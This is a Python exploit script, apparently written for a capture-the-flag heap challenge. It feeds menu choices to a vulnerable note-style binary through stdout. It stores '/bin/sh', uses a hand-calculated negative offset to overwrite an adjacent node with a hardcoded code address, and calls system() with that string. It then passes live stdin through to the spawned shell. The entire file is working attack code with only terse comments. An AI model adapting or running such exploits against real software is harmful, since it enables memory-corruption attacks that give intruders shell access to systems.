import sys
import time


time.sleep(2)
print("run")
sys.stdout.flush()

print(1)
sys.stdout.flush()
print(1)
sys.stdout.flush()
print(0x10)
sys.stdout.flush()
print("/bin/sh\0")
sys.stdout.flush()
time.sleep(3)

print(1)
sys.stdout.flush()
print(2)
sys.stdout.flush()
print(0x10)
sys.stdout.flush()
print("aaaa")
sys.stdout.flush()
time.sleep(3)

# 1st Edit, to overwrite 1st node from 2nd node
print(3)
sys.stdout.flush()
print(2)
sys.stdout.flush()
print(-0x68) # (important!) manually calculated
sys.stdout.flush()
# goto 0x40129c CALL SYSTEM
# payload = b"\x9c\x12\x40\x00\x00\x00\x00\x00"
payload = b"\xe4\x10\x40\x00\x00\x00\x00\x00"
sys.stdout.buffer.write(payload)
sys.stdout.flush()
time.sleep(3)

# 2nd Edit, this time jump to system(), with rdi="/bin/sh"
print(3)
sys.stdout.flush()
print(1)
sys.stdout.flush()
time.sleep(5)


# let the real stdin take over
while True:
    try:
        print(input())
    except EOFError:
        break
    except KeyboardInterrupt:
        break
    except:
        pass
